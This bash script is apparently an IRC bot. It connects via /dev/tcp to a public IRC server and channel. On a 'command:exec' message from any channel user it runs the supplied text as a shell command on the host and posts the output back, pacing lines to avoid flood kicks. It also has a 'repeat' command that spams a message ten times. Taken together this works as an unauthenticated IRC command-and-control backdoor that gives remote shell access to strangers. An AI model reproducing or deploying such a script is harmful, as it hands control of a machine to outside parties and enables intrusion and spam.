#!/bin/bash
##########################################################
# Config
NICK="G42t10j"
SERVER="irc.eu.ponychat.net"
PORT=6667
CHANNEL="#pony"
##########################################################
# Main
exec 4>/tmp/file	#open 4 pointer as writer to /tmp/file
exec 5</tmp/file	#open 5 pointer as reader to /tmp/file
exec 3<>/dev/tcp/${SERVER}/${PORT}	#open 3 pointer as tcp connector and connect
echo "NICK ${NICK}" >&3			#configure userdetails
echo "USER ${NICK} 8 * : ${NICK}" >&3
echo "JOIN ${CHANNEL}" >&3
#echo "/list" >&3
run=true
while [ $run ]; do #returns true when string not null
	read -u 3 a b	#read packet from irc server
	echo $a $b
	if [ "$a" = "PING" ] 
	then
		echo "PONG" $b >&3
		echo "answered ping"
	fi
	IFS=':' read -a array <<< "$b" # split string in array with :
	#	OLD_IFS="$IFS"
	#	IFS=":"
	#	array=( $b )
	#	IFS="$OLD_IFS"
	if [ "${array[1]}" = "command" ]
	then
		echo "privmsg" ${CHANNEL} ${array[2]} >&3
		echo "antworte"
		if [ "${array[2]}" = "exec" ]
		then
			${array[3]} >&4
			${array[3]} >&0
			DONE=false
			counter=0
			until $DONE ;do
				read -u 5 || DONE=true
				echo "privmsg" ${CHANNEL} ":" $REPLY >&3
				let "counter += 1"
				if [ $counter -eq 3 ]  #to prevert Excess Flood kick
				then
					counter=0
					sleep 1
				fi
			done
		fi
		if [ "${array[2]}" = "repeat" ]
		then
			counter=10
			until [ $counter -eq 0 ]; do
				echo "privmsg" ${CHANNEL} ":"${array[3]} >&3
				echo "privmsg" ${CHANNEL} ${array[3]}
				let "counter -= 1"
				sleep 1
			done
		fi
		if [ "${array[2]}" = "quit" ]
		then
			echo "privmsg" ${CHANNEL} "ragequit" >&3
			echo "quit" >&3
			run=false
		fi
	fi
done
exec 3<&-	#close socks
exec 3>&-
#cat <&3
exit $?
